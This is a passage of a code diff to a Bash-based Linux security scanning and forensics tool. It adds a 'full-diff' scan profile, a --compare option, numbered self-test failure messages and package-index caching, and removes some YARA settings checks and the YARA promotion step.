+        bash "$OUTPUT_DIR/verify-report.sh" >/dev/null 2>&1 || { failures=$((failures + 1)); echo "SELFTEST-FAIL:73" >&2; }
     fi
     rm -f "$OUTPUT_DIR/untracked.txt"
     printf 'tampered evidence\n' >> "$RAW_DIR/sample.txt"
     bash "$OUTPUT_DIR/verify-report.sh" >/dev/null 2>&1 && failures=$((failures + 1))
     printf 'self-test raw evidence\n' > "$RAW_DIR/sample.txt"
     if command -v python3 >/dev/null 2>&1; then
-        python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); assert d["schema_version"] == 3 and d["platform"] == "linux" and d["profile"] in ("fast-hunt","daily-hunt","full","corpus-validation") and d["local_addresses"] and d["portable_paths"]["findings"] == "findings.json"; assert "telemetry_health" in d and "process_behavior_baseline" in d and "beacon_detection" in d and "connection_baseline" in d; assert d["web_access_log"]["WEB_ACCESS_LOG_STATUS"] in ("MISSING","AVAILABLE","PARTIAL"); assert "priority_model" in d["file_monitoring"] and "priority_model" in d["file_scan"]; assert "container_context" in d and "kubernetes_context" in d; assert d["yara"]["mode"] in ("disabled","lite","standard","full","forensic") and "promoted_findings" in d["yara"]' "$STATUS_FILE" || failures=$((failures + 1))
-        python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); types={x["finding_type"] for x in d["findings"]}; assert "SECURITY_THREAT" in types and "SECURITY_ANOMALY" in types and "file_changes" in d and "abnormal_connections" in d; assert all(isinstance(x["evidence_domains"],list) and isinstance(x["attack_timeline"],list) and x["evidence_domain_count"]==len(set(x["evidence_domains"])) for x in d["findings"])' "$OUTPUT_DIR/findings.json" || failures=$((failures + 1))
-        python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); assert "files" in d' "$OUTPUT_DIR/raw-manifest.json" || failures=$((failures + 1))
-        python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); assert "files" in d' "$OUTPUT_DIR/report-manifest.json" || failures=$((failures + 1))
+        python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); assert d["schema_version"] == 3 and d["platform"] == "linux" and d["profile"] in ("fast-hunt","daily-hunt","full","corpus-validation") and d["local_addresses"] and d["portable_paths"]["findings"] == "findings.json"; assert "telemetry_health" in d and "process_behavior_baseline" in d and "beacon_detection" in d and "connection_baseline" in d; assert d["web_access_log"]["WEB_ACCESS_LOG_STATUS"] in ("MISSING","AVAILABLE","PARTIAL"); assert "priority_model" in d["file_monitoring"] and "priority_model" in d["file_scan"]; assert "container_context" in d and "kubernetes_context" in d; assert "raw" in d.get("file_scan", {})' "$STATUS_FILE" || { failures=$((failures + 1)); echo "SELFTEST-FAIL:75" >&2; }
+        python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); types={x["finding_type"] for x in d["findings"]}; assert "SECURITY_THREAT" in types and "SECURITY_ANOMALY" in types and "file_changes" in d and "abnormal_connections" in d; assert all(isinstance(x["evidence_domains"],list) and isinstance(x["attack_timeline"],list) and x["evidence_domain_count"]==len(set(x["evidence_domains"])) for x in d["findings"])' "$OUTPUT_DIR/findings.json" || { failures=$((failures + 1)); echo "SELFTEST-FAIL:76" >&2; }
+        python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); assert "files" in d' "$OUTPUT_DIR/raw-manifest.json" || { failures=$((failures + 1)); echo "SELFTEST-FAIL:77" >&2; }
+        python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); assert "files" in d' "$OUTPUT_DIR/report-manifest.json" || { failures=$((failures + 1)); echo "SELFTEST-FAIL:78" >&2; }
     fi
-    update_report_archive_index || failures=$((failures + 1))
-    grep -q '打开报告' "$REPORT_ROOT/index.html" 2>/dev/null || failures=$((failures + 1))
+    update_report_archive_index || { failures=$((failures + 1)); echo "SELFTEST-FAIL:79" >&2; }
+    grep -q '打开报告' "$REPORT_ROOT/index.html" 2>/dev/null || { failures=$((failures + 1)); echo "SELFTEST-FAIL:80" >&2; }
     grep -q 'ARCHIVE_ROWS' "$REPORT_ROOT/index.html" 2>/dev/null && failures=$((failures + 1))
     rm -rf -- "$test_root"
     if [ "$failures" -eq 0 ]; then
@@ -9604,7 +10723,7 @@ main() {
                     --report-root) REPORT_ROOT="$2" ;;
                     --file-scan-config) FILE_SCAN_CONFIG_FILE="$2" ;;
                     --mode) case "$(printf '%s' "$2" | tr '[:upper:]' '[:lower:]')" in hunt) RUN_MODE=Hunt; MODE_EXPLICIT=true ;; full) RUN_MODE=Full; MODE_EXPLICIT=true ;; *) log_error '--mode 仅支持 hunt 或 full'; return 2 ;; esac ;;
-                    --profile) profile_arg=$(printf '%s' "$2" | tr '[:upper:]' '[:lower:]'); case "$profile_arg" in fast-hunt|daily-hunt|full|corpus-validation) SCAN_PROFILE="$profile_arg"; PROFILE_EXPLICIT=true ;; *) log_error '--profile 仅支持 fast-hunt、daily-hunt、full 或 corpus-validation'; return 2 ;; esac ;;
+                    --profile) profile_arg=$(printf '%s' "$2" | tr '[:upper:]' '[:lower:]'); case "$profile_arg" in fast-hunt|daily-hunt|full|full-diff|corpus-validation) SCAN_PROFILE="$profile_arg"; PROFILE_EXPLICIT=true ;; *) log_error '--profile 仅支持 fast-hunt、daily-hunt、full、full-diff 或 corpus-validation'; return 2 ;; esac ;;
                     --host-role) HOST_ROLE=$(printf '%s' "$2" | tr '[:upper:]' '[:lower:]') ;;
                     --corpus-root) CORPUS_ROOT="$2" ;;
                     --corpus-manifest) CORPUS_MANIFEST_FILE="$2" ;;
@@ -9614,6 +10733,9 @@ main() {
             --init-state) INIT_STATE=true; shift ;;
             --reset-state) RESET_STATE=true; shift ;;
             --no-state) STATE_ENABLED=false; shift ;;
+            --compare)
+                if [ $# -lt 2 ]; then log_error "--compare 需要上一轮输出目录参数"; exit 2; fi
+                COMPARE_DIR="$2"; shift 2 ;;
             --scheduled) SCHEDULED_RUN=true; EXECUTION_MODE="scheduled"; shift ;;
             --schedule-time)
                 if [ $# -lt 2 ] || ! valid_schedule_time "$2"; then
@@ -9653,6 +10775,10 @@ main() {
     requested_mode="$RUN_MODE"
     if [ "$PROFILE_EXPLICIT" = false ] && [ "$RUN_MODE" = Full ]; then SCAN_PROFILE=full; fi
     apply_scan_profile || { log_error "无效扫描 Profile: $SCAN_PROFILE"; return 2; }
+    # full-diff 与 full 共享文件基线/分析缓存/报告目录：稳态差分复用 full 的
+    # 基线，周检 full 与日常 full-diff 交替不会互相失效。
+    STATE_PROFILE_KEY="$SCAN_PROFILE"
+    [ "$SCAN_PROFILE" != full-diff ] || STATE_PROFILE_KEY=full
     [ "$MODE_EXPLICIT" = false ] || RUN_MODE="$requested_mode"
     if [ "$SCAN_PROFILE" = corpus-validation ]; then
         [ -n "$CORPUS_ROOT" ] && [ -n "$CORPUS_MANIFEST_FILE" ] || { log_error 'corpus-validation 必须同时指定 --corpus-root 和 --corpus-manifest'; return 2; }
@@ -9694,15 +10820,6 @@ main() {
         log_error 'SECSCOPE_EVENT_WINDOW_MINUTES 必须是 10-10080 的整数'
         return 2
     }
-    [[ "$YARA_FILE_TIMEOUT" =~ ^[0-9]+$ ]] && [ "$YARA_FILE_TIMEOUT" -ge 1 ] && [ "$YARA_FILE_TIMEOUT" -le 3600 ] || { log_error 'SECSCOPE_YARA_FILE_TIMEOUT 必须是 1-3600 的整数'; return 2; }
-    [[ "$YARA_TOTAL_TIMEOUT" =~ ^[0-9]+$ ]] && [ "$YARA_TOTAL_TIMEOUT" -ge 1 ] && [ "$YARA_TOTAL_TIMEOUT" -le 86400 ] || { log_error 'SECSCOPE_YARA_TOTAL_TIMEOUT 必须是 1-86400 的整数'; return 2; }
-    if [ "$YARA_MODE" = disabled ]; then
-        [[ "$YARA_MAX_FILES" =~ ^[0-9]+$ ]] || { log_error 'SECSCOPE_YARA_MAX_FILES 必须是整数'; return 2; }
-    else
-        [[ "$YARA_MAX_FILES" =~ ^[0-9]+$ ]] && [ "$YARA_MAX_FILES" -ge 1 ] && [ "$YARA_MAX_FILES" -le 1000000 ] || { log_error 'SECSCOPE_YARA_MAX_FILES 必须是 1-1000000 的整数'; return 2; }
-    fi
-    [[ "$YARA_MAX_RULE_SOURCES" =~ ^[0-9]+$ ]] && [ "$YARA_MAX_RULE_SOURCES" -ge 1 ] && [ "$YARA_MAX_RULE_SOURCES" -le 4096 ] || { log_error 'SECSCOPE_YARA_MAX_RULE_SOURCES 必须是 1-4096 的整数'; return 2; }
-    [[ "$YARA_RULE_MAX_DEPTH" =~ ^[0-9]+$ ]] && [ "$YARA_RULE_MAX_DEPTH" -ge 1 ] && [ "$YARA_RULE_MAX_DEPTH" -le 20 ] || { log_error 'SECSCOPE_YARA_RULE_MAX_DEPTH 必须是 1-20 的整数'; return 2; }
     for numeric in "$RETENTION_DAYS" "$HIGH_RETENTION_DAYS"; do
         [[ "$numeric" =~ ^-1$|^[0-9]+$ ]] || { log_error '保留天数必须是 -1（永久）或非负整数'; return 2; }
     done
@@ -9721,7 +10838,7 @@ main() {
         return 3
     fi
 
-    case "$SCAN_PROFILE" in fast-hunt) report_profile_dir=fast ;; daily-hunt) report_profile_dir=daily ;; full) report_profile_dir=full ;; corpus-validation) report_profile_dir=corpus-validation ;; esac
+    case "$SCAN_PROFILE" in fast-hunt) report_profile_dir=fast ;; daily-hunt) report_profile_dir=daily ;; full|full-diff) report_profile_dir=full ;; corpus-validation) report_profile_dir=corpus-validation ;; esac
     if [ "$OUTPUT_DIR_EXPLICIT" = false ]; then REPORT_ROOT="${REPORT_ROOT%/}/${report_profile_dir}"; fi
     [ -L "$REPORT_ROOT" ] && { log_error "拒绝使用符号链接报告根目录: $REPORT_ROOT"; return 1; }
     if ! mkdir -p "$REPORT_ROOT" || ! chmod 700 "$REPORT_ROOT"; then
@@ -9744,6 +10861,17 @@ main() {
     OUTPUT_DIR=$(cd "$OUTPUT_DIR" && pwd -P) || return 1
     RAW_DIR="$OUTPUT_DIR/raw"
     mkdir -p "$RAW_DIR" && chmod 700 "$OUTPUT_DIR" "$RAW_DIR" || return 1
+    # 包归属索引跨轮持久化：dpkg/rpm 数据库更新后失效重建；状态存储不可用时退回轮内文件。
+    if [ "$STATE_ENABLED" = true ]; then
+        PACKAGE_INDEX_CACHE_FILE="${STATE_DIR}/package_index.cache"
+        if [ /var/lib/dpkg/status -nt "$PACKAGE_INDEX_CACHE_FILE" ] 2>/dev/null || \
+            { [ -d /var/lib/rpm ] && [ /var/lib/rpm -nt "$PACKAGE_INDEX_CACHE_FILE" ]; }; then
+            rm -f -- "$PACKAGE_INDEX_CACHE_FILE" 2>/dev/null || true
+        fi
+    else
+        PACKAGE_INDEX_CACHE_FILE="${OUTPUT_DIR}/.package-index.${RUN_ID}"
+    fi
+    FILE_HASH_INDEX_FILE="${RAW_DIR}/hash-index.tsv"
     printf '%s\n' '警告：raw 为完整取证证据，可能包含账户、IP、环境变量、命令行凭据、密码或 Token。请限制访问和传输；对外分享请使用 --share-package 并人工复核。' > "${RAW_DIR}/SENSITIVE-DATA-WARNING.txt"
     chmod 600 "${RAW_DIR}/SENSITIVE-DATA-WARNING.txt"
     record_raw_status 'SENSITIVE-DATA-WARNING.txt' SUCCESS bootstrap ''
@@ -9788,17 +10916,15 @@ main() {
     profile_module_enabled history     && run_module history     '历史与环境'     check_history_env
     profile_module_enabled services    && run_module services    '服务与供应链'   check_services
     profile_module_enabled logs        && run_module logs        '日志分析'       check_logs
+    profile_module_enabled correlation && run_module correlation '攻击链关联'     run_correlation_module
     profile_module_enabled memory      && run_module memory      '内存轻量取证'   check_memory
     profile_module_enabled baseline    && run_module baseline    '配置基线'       check_baseline
-    CURRENT_MODULE=yara
-    benchmark_stage_begin yara_promotion
-    promote_yara_findings
-    benchmark_stage_end yara_promotion
     write_suppression_audit || mark_current_module_partial suppression_audit_failed
     calculate_coverage
     progress_bar "$MODULE_COMPLETED" "$MODULE_TOTAL" '结果汇总' RUNNING '正在对账状态并生成报告'
 
     benchmark_stage_begin state_reconcile
+    finalize_finding_hashes
     if ! reconcile_state; then
         state_failed=1
         STATE_HEALTH="FAILED"
@@ -9812,10 +10938,16 @@ main() {
     benchmark_stage_end report_html
     benchmark_stage_begin report_json
     if [ "$report_failed" -eq 0 ]; then
-        write_findings_json || { log_warn 'findings.json 写入失败'; report_failed=1; }
+        # v2.1：generate_report 已在渲染前落盘 findings.json/status.json；
+        # 此处仅在未写过时执行，避免 one-shot 大数组二次全量序列化。
+        if [ "${REPORT_DATA_WRITTEN:-false}" != true ]; then
+            write_findings_json || { log_warn 'findings.json 写入失败'; report_failed=1; }
+        else REPORT_DATA_WRITTEN=false; fi
     fi
     if [ "$report_failed" -eq 0 ]; then
-        write_status_json "$(verdict_text)" || { log_warn 'status.json 写入失败，拒绝提交文件增量基线'; report_failed=1; }
+        if [ "${REPORT_DATA_WRITTEN:-false}" != true ]; then
+            write_status_json "$(verdict_text)" || { log_warn 'status.json 写入失败，拒绝提交文件增量基线'; report_failed=1; }
+        else REPORT_DATA_WRITTEN=false; fi
     fi
     benchmark_stage_end report_json
     apply_retention
